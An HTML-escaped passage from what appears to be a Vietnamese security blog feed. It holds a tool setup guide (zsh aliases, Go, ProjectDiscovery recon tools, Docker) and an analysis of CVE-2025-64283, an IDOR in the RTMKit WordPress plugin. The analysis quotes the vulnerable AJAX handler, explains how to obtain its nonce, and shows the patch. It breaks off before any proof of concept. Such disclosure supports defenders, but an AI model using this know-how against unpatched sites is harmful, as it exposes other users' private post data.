2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;nano ~/.zshrc&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;alias ports=&amp;#39;ss -tulnp&amp;#39;&#xA;alias myip=&amp;#39;ip a | grep inet&amp;#39;&#xA;alias serve=&amp;#39;python3 -m http.server&amp;#39;&#xA;alias cls=&amp;#39;clear&amp;#39;&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;source ~/.zshrc&lt;/code&gt;&lt;/pre&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;golang&#34;&gt;&lt;span&gt;Golang&lt;/span&gt;&#xA;  &lt;a href=&#34;#golang&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;&lt;strong&gt;T·∫£i&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;sudo apt install golang-go -y&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;2&#34;&gt;&#xA;&lt;li&gt;&lt;strong&gt;C·∫•u h√¨nh&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;nano ~/.zshrc&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;export PATH=&amp;#34;$HOME/go/bin:$PATH&amp;#34;&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;source ~/.zshrc&lt;/code&gt;&lt;/pre&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;some-tool-from-project-discovery&#34;&gt;&lt;span&gt;Some Tool from Project Discovery&lt;/span&gt;&#xA;  &lt;a href=&#34;#some-tool-from-project-discovery&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;&lt;code&gt;nuclei&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;nuclei -update-templates&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;2&#34;&gt;&#xA;&lt;li&gt;&lt;code&gt;httpx&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;3&#34;&gt;&#xA;&lt;li&gt;&lt;code&gt;subfinder&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;4&#34;&gt;&#xA;&lt;li&gt;&lt;code&gt;dnsx&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;go install -v github.com/projectdiscovery/dnsx/cmd/dnsx@latest&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;5&#34;&gt;&#xA;&lt;li&gt;&lt;code&gt;katana&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;go install -v github.com/projectdiscovery/katana/cmd/katana@latest&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;6&#34;&gt;&#xA;&lt;li&gt;&lt;code&gt;assetfinder&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;go install github.com/tomnomnom/assetfinder@latest&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;7&#34;&gt;&#xA;&lt;li&gt;&lt;code&gt;chaos-client&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;go install -v github.com/projectdiscovery/chaos-client/cmd/chaos@latest&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;8&#34;&gt;&#xA;&lt;li&gt;&lt;code&gt;uncover&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;go install -v github.com/projectdiscovery/uncover/cmd/uncover@latest&lt;/code&gt;&lt;/pre&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;docker&#34;&gt;&lt;span&gt;Docker&lt;/span&gt;&#xA;  &lt;a href=&#34;#docker&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;sudo apt install -y docker.io&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;sudo systemctl start docker  &lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;sudo usermod -aG docker $USER&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;sudo apt install docker-compose -y&lt;/code&gt;&lt;/pre&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;telegram-desktop&#34;&gt;&lt;span&gt;Telegram Desktop&lt;/span&gt;&#xA;  &lt;a href=&#34;#telegram-desktop&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;sudo apt install telegram-desktop -y&lt;/code&gt;&lt;/pre&gt;</description>
    </item>
    <item>
      <title>CVE-2025-64283 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2025-12-24-cve-2025-64283/</link>
      <pubDate>Wed, 24 Dec 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2025-12-24-cve-2025-64283/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-12-24-cve-2025-64283/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;L·ªó h·ªïng &lt;strong&gt;v∆∞·ª£t qua c∆° ch·∫ø x√°c th·ª±c (Authorization Bypass)&lt;/strong&gt; th√¥ng qua &lt;strong&gt;kh√≥a do ng∆∞·ªùi d√πng ki·ªÉm so√°t (User-Controlled Key)&lt;/strong&gt; trong &lt;strong&gt;Rometheme RTMKit (rometheme-for-elementor)&lt;/strong&gt; cho ph√©p &lt;strong&gt;khai th√°c c∆° ch·∫ø ki·ªÉm so√°t truy c·∫≠p ƒë∆∞·ª£c c·∫•u h√¨nh kh√¥ng ƒë√∫ng (Incorrectly Configured Access Control)&lt;/strong&gt;.&#xA;L·ªó h·ªïng n√†y ·∫£nh h∆∞·ªüng ƒë·∫øn &lt;strong&gt;RTMKit&lt;/strong&gt; t·ª´ &lt;strong&gt;n/a&lt;/strong&gt; ƒë·∫øn &lt;strong&gt;phi√™n b·∫£n ‚â§ 1.6.7&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-64283&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-64283&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Insecure Direct Object References (IDOR)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 1.6.7&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 1.6.8&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: Low (5.4)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Contributor&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;hhttps://wordpress.org/plugins/rometheme-for-elementor/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress ARTMKit Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin Version&lt;/strong&gt; - &lt;strong&gt;ARTMKit&lt;/strong&gt;:&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;1.6.7&lt;/code&gt; ‚Äì &lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;1.6.8&lt;/code&gt; ‚Äì &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; ‚Üí &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; ho·∫∑c b·∫•t k·ª≥ c√¥ng c·ª• diff n√†o.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Plugin ƒë√£ ƒëƒÉng k√Ω action hook:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;add_action(&amp;#39;wp_ajax_get_template_content&amp;#39;, [$this, &amp;#39;get_template_content&amp;#39;]);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Trong WordPress, ti·ªÅn t·ªë &lt;code&gt;wp_ajax_&lt;/code&gt; d√πng ƒë·ªÉ x·ª≠ l√Ω c√°c y√™u c·∫ßu AJAX g·ª≠i ƒë·∫øn &lt;code&gt;/wp-admin/admin-ajax.php&lt;/code&gt; t·ª´ &lt;strong&gt;ng∆∞·ªùi d√πng ƒë√£ ƒëƒÉng nh·∫≠p&lt;/strong&gt;. Khi request c√≥ tham s·ªë &lt;code&gt;action=get_template_content&lt;/code&gt;, WordPress s·∫Ω g·ªçi h√†m &lt;code&gt;get_template_content&lt;/code&gt; t∆∞∆°ng ·ª©ng ƒë·ªÉ x·ª≠ l√Ω v√† tr·∫£ v·ªÅ d·ªØ li·ªáu.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function get_template_content()&#xA;{&#xA;    if (!isset($_POST[&amp;#39;wpnonce&amp;#39;]) ||  ! check_ajax_referer(&amp;#39;rtm_template_nonce&amp;#39;, &amp;#39;wpnonce&amp;#39;)) {&#xA;        wp_send_json_error(&amp;#39;Access Denied&amp;#39;);&#xA;        wp_die();&#xA;    }&#xA;&#xA;    $id = absint($_POST[&amp;#39;template&amp;#39;]);&#xA;&#xA;    $elementorData = get_post_meta($id, &amp;#39;_elementor_data&amp;#39;, true);&#xA;&#xA;    $data = [&amp;#39;content&amp;#39; =&amp;gt; json_decode($elementorData)];&#xA;&#xA;    wp_send_json_success($data);&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;H√†m &lt;code&gt;get_template_content&lt;/code&gt; x·ª≠ l√Ω request AJAX v√† th·ª±c hi·ªán c√°c b∆∞·ªõc sau:&lt;/p&gt;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;Ki·ªÉm tra s·ª± t·ªìn t·∫°i c·ªßa &lt;code&gt;wpnonce&lt;/code&gt; v√† x√°c th·ª±c nonce b·∫±ng &lt;code&gt;check_ajax_referer&lt;/code&gt; ƒë·ªÉ ƒë·∫£m b·∫£o request h·ª£p l·ªá, ch·ªëng CSRF.&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;div class=&#34;alert alert-tip&#34;&gt;&lt;p class=&#34;alert-title&#34;&gt;&lt;svg class=&#34;icon&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34; viewBox=&#34;0 0 16 16&#34; width=&#34;16&#34; height=&#34;16&#34;&gt;&lt;path d=&#34;M8 1.5c-2.363.0-4 1.69-4 3.75.0.984.424 1.625.984 2.304l.214.253c.223.264.47.556.673.848.284.411.537.896.621 1.49a.75.75.0 01-1.484.211c-.04-.282-.163-.547-.37-.847a8.456 8.456.0 00-.542-.68c-.084-.1-.173-.205-.268-.32C3.201 7.75 2.5 6.766 2.5 5.25 2.5 2.31 4.863.0 8 0s5.5 2.31 5.5 5.25c0 1.516-.701 2.5-1.328 3.259-.095.115-.184.22-.268.319-.207.245-.383.453-.541.681-.208.3-.33.565-.37.847a.751.751.0 01-1.485-.212c.084-.593.337-1.078.621-1.489.203-.292.45-.584.673-.848.075-.088.147-.173.213-.253.561-.679.985-1.32.985-2.304.0-2.06-1.637-3.75-4-3.75zM5.75 12h4.5a.75.75.0 010 1.5h-4.5a.75.75.0 010-1.5zM6 15.25a.75.75.0 01.75-.75h2.5a.75.75.0 010 1.5h-2.5A.75.75.0 016 15.25z&#34;/&gt;&lt;/svg&gt;M·∫πo&lt;/p&gt;&lt;p&gt;Khi search v·ªõi t·ª´ kh√≥a &lt;code&gt;rtm_template_nonce&lt;/code&gt;&#xA;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-24-cve-2025-64283/create_nonce.png&#34; title=&#34;C√°ch nonce ƒë∆∞·ª£c t·∫°o&#34; data-thumbnail=&#34;/posts/2025-12-24-cve-2025-64283/create_nonce.png&#34; data-sub-html=&#34;&lt;h2&gt;Create nonce&lt;/h2&gt;&lt;p&gt;C√°ch nonce ƒë∆∞·ª£c t·∫°o&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-24-cve-2025-64283/create_nonce.png&#39; alt=&#34;Create nonce&#34; height=&#34;239&#34; width=&#34;1197&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;C√°ch nonce ƒë∆∞·ª£c t·∫°o&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&#xA;Nonce ƒë∆∞·ª£c t·∫°o b·∫±ng &lt;code&gt;wp_create_nonce(&#39;rtm_template_nonce&#39;)&lt;/code&gt; v√† ƒë∆∞·ª£c &lt;strong&gt;g·∫Øn v√†o bi·∫øn JavaScript&lt;/strong&gt; &lt;code&gt;rkit_libs&lt;/code&gt; th√¥ng qua &lt;code&gt;wp_localize_script&lt;/code&gt; v·ªõi &lt;strong&gt;key l∆∞u tr·ªØ l√† &lt;code&gt;template_nonce&lt;/code&gt;&lt;/strong&gt;. Ph√≠a client s·∫Ω s·ª≠ d·ª•ng gi√° tr·ªã n√†y v√† g·ª≠i l√™n server trong request AJAX d∆∞·ªõi d·∫°ng tham s·ªë &lt;code&gt;wpnonce&lt;/code&gt; ƒë·ªÉ ph·ª•c v·ª• cho b∆∞·ªõc x√°c th·ª±c.&#xA;Khi filter request b·∫±ng BurpSuite v·ªõi t·ª´ kh√≥a &lt;code&gt;rkit_libs&lt;/code&gt; s·∫Ω th·∫•y ƒë∆∞·ª£c gi√° tr·ªã n√†y&#xA;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-24-cve-2025-64283/nonce.png&#34; title=&#34;Nonce value&#34; data-thumbnail=&#34;/posts/2025-12-24-cve-2025-64283/nonce.png&#34; data-sub-html=&#34;&lt;h2&gt;Nonce value&lt;/h2&gt;&lt;p&gt;Nonce value&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-24-cve-2025-64283/nonce.png&#39; alt=&#34;Nonce value&#34; height=&#34;328&#34; width=&#34;1537&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Nonce value&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&lt;/div&gt;&lt;ol start=&#34;2&#34;&gt;&#xA;&lt;li&gt;L·∫•y tham s·ªë &lt;code&gt;template&lt;/code&gt; t·ª´ &lt;code&gt;POST&lt;/code&gt; v√† √©p ki·ªÉu s·ªë nguy√™n b·∫±ng &lt;code&gt;absint&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Truy xu·∫•t d·ªØ li·ªáu &lt;code&gt;_elementor_data&lt;/code&gt; t∆∞∆°ng ·ª©ng v·ªõi post ID th√¥ng qua &lt;code&gt;get_post_meta&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Gi·∫£i m√£ d·ªØ li·ªáu JSON v√† ƒë√≥ng g√≥i v√†o m·∫£ng k·∫øt qu·∫£.&lt;/li&gt;&#xA;&lt;li&gt;Tr·∫£ v·ªÅ d·ªØ li·ªáu b·∫±ng ph·∫£n h·ªìi JSON th√†nh c√¥ng (&lt;code&gt;wp_send_json_success&lt;/code&gt;).&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;div class=&#34;details admonition bug open disabled&#34;&gt;&#xA;  &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-bug&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;L·ªói&lt;/div&gt;&#xA;  &lt;div class=&#34;details-content&#34;&gt;&#xA;    &lt;div class=&#34;admonition-content&#34;&gt;&lt;p&gt;L·ªó h·ªïng xu·∫•t hi·ªán khi &lt;code&gt;$id&lt;/code&gt; kh√¥ng ƒë∆∞·ª£c ki·ªÉm so√°t ch·∫∑t, khi·∫øn ng∆∞·ªùi d√πng &lt;strong&gt;Contributor+&lt;/strong&gt; c√≥ th·ªÉ l·∫•y b·∫•t c·ª© d·ªØ li·ªáu post n√†o c·ªßa ng∆∞·ªùi d√πng kh√°c.&lt;/p&gt;&lt;/div&gt;&#xA;  &lt;/div&gt;&#xA;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;B·∫£n v√° v1.6.8&lt;/strong&gt; b·ªï sung b∆∞·ªõc ki·ªÉm tra quy·ªÅn ng∆∞·ªùi d√πng b·∫±ng &lt;code&gt;current_user_can(&#39;manage_options&#39;)&lt;/code&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;if (!current_user_can(&amp;#39;manage_options&amp;#39;)) {&#xA;    wp_send_json_error(&amp;#39;Access Denied: Insufficient permissions&amp;#39;);&#xA;    wp_die();&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;ƒê·∫£m b·∫£o ch·ªâ nh·ªØng user c√≥ quy·ªÅn &lt;strong&gt;Administrator&lt;/strong&gt; m·ªõi ƒë∆∞·ª£c ph√©p ti·∫øp t·ª•c x·ª≠ l√Ω. N·∫øu ng∆∞·ªùi d√πng kh√¥ng ƒë·ªß quy·ªÅn, request s·∫Ω b·ªã t·ª´ ch·ªëi ngay v√† tr·∫£ v·ªÅ th√¥ng b√°o l·ªói &lt;code&gt;Access Denied: Insufficient permissions&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 